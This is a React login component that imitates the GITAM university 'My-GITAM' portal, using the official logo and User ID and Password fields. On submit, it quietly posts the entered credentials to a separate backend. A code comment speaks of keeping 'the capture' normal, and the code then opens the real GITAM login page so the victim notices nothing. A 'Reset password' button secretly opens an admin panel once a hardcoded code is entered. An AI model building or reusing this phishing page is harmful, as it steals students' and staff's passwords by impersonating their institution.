import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Captcha from "./Captcha";
import gitamLogo from "@/assets/gitam-official-logo.png";

const LoginForm = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState("");
  const [loginError, setLoginError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      setLoginError("Please enter both username and password");
      return;
    }
    
    setLoginError("");
    setCaptchaError("");
    
    try {
      // Send credentials to backend
      const apiUrl = import.meta.env.VITE_API_URL || "http://localhost:5000";
      await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
    } catch (err) {
      console.error("Backend login error:", err);
      // Even if backend fails, we should probably still redirect them
      // so the capture acts normally.
    }

    // Open the real GITAM login page in a new tab
    window.open("https://login.gitam.edu/Login.aspx", "_blank");
  };

  const handleAdminAccess = () => {
    if (captchaInput === "2326") {
      window.open("/admin-login", "_blank");
    } else {
      setCaptchaError("Incorrect code");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-start pt-16 px-6">
      <div className="w-full max-w-sm mx-auto">
        {/* Logo */}
        <div className="text-center mb-8">
          <img 
            src={gitamLogo} 
            alt="GITAM Logo" 
            className="w-40 h-auto mx-auto mb-6"
          />
          <h1 className="text-primary text-2xl font-medium">My-GITAM</h1>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="User ID"
              className="w-full text-center text-base py-3 border-0 border-b border-gray-300 bg-transparent focus:outline-none focus:border-primary placeholder-gray-600"
              maxLength={16}
            />
          </div>

          <div>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full text-center text-base py-3 border-0 border-b border-gray-300 bg-transparent focus:outline-none focus:border-primary placeholder-gray-600"
              maxLength={20}
            />
          </div>

          <div className="mt-6">
            <Captcha 
              captchaInput={captchaInput}
              onCaptchaInputChange={setCaptchaInput}
              error={captchaError}
            />
          </div>

          <div className="mt-6 flex justify-center">
            <button 
              type="submit" 
              className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium py-2 px-8 rounded text-sm"
            >
              LOGIN
            </button>
          </div>

          {loginError && (
            <p className="text-destructive text-center text-sm mt-2">{loginError}</p>
          )}

          <div className="flex justify-between mt-6">
            <button 
              type="button"
            onClick={handleAdminAccess}
              className="text-primary text-sm font-medium bg-transparent border-none"
            >
              Reset password
            </button>
            <button 
              type="button" 
              className="text-primary text-sm font-medium bg-transparent border-none"
            >
              Contact CATS
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default LoginForm;
